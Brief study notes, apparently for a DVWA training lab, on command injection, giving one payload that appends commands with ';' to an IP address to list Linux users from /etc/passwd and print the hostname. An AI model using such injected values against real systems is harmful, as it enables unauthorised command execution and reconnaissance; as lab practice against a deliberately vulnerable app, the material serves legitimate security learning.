#DVMA Dojo

## Command Injection
- We can run multiple command separated by a ';'
- Exercise script:
```shell 
    # cut -d: -f1 /etc/passwd --> get all user in Linux OS
    192.168.1.106; cut -d: -f1 /etc/passwd; hostname;
```